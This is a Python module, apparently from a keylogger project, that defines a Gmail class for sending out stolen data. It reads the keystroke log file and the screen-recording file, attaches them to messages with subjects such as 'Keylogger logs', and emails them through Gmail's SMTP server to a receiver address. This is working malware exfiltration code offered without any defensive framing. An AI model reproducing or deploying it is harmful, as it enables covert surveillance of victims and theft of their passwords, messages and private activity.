import email
import os
import re
import smtplib
import ssl
from email.mime.multipart import MIMEMultipart, MIMEBase
from email.mime.text import MIMEText

from ..interfaces import MessengerBase


class Gmail(MessengerBase):
    def __init__(self,
                 app_password,
                 log_file_location,
                 screen_recorder_file_location):
        self._app_password = app_password
        self.log_file_location = log_file_location
        self.screen_recorder_file_location = screen_recorder_file_location
        self._sender_address = None
        self._receiver_address = None
        self._context = ssl.create_default_context()

    @property
    def sender_address(self):
        return self._sender_address

    @property
    def receiver_address(self):
        return self._receiver_address

    @sender_address.setter
    def sender_address(self, address):
        if not re.match(r"[^@]+@[^@]+\.[^@]+", address):
            raise InvalidEmailException
        print(f"Setting Gmail sender address to: {address}")
        self._sender_address = address

    @receiver_address.setter
    def receiver_address(self, address):
        if not re.match(r"[^@]+@[^@]+\.[^@]+", address):
            raise InvalidEmailException
        print(f"Setting receiver address to: {address}")
        self._receiver_address = address

    def send_logs(self):
        message = self._initialize_mail("Keylogger logs")
        message = self._attach_log_file(message, self.log_file_location)
        self.send_mail(message)

    def send_recording(self):
        message = self._initialize_mail("Keylogger screen recording")
        message = self._attach_recording(message, self.screen_recorder_file_location)
        self.send_mail(message)

    def send_everything(self):
        message = self._initialize_mail("Keylogger")
        message = self._attach_recording(message, self.screen_recorder_file_location)
        message = self._attach_log_file(message, self.log_file_location)
        self.send_mail(message)

    def send_mail(self, message):
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=self._context) as server:
            server.login(self._sender_address, self._app_password)
            server.sendmail(self._sender_address, self._receiver_address, message.as_string())

    def _attach_log_file(self, message, filename):
        f = open(filename)
        attachment = MIMEText(f.read())
        attachment.add_header('Content-Disposition', 'attachment', filename=filename)
        message.attach(attachment)
        return message

    def _attach_recording(self, message, filename):
        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(filename, "rb").read())
        email.encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(filename))
        message.attach(part)
        return message

    def _initialize_mail(self, subject, body=''):
        message = MIMEMultipart()
        message['From'] = self._sender_address
        message['To'] = self._receiver_address
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))
        return message


class InvalidEmailException(Exception):
    """Given email is invalid"""
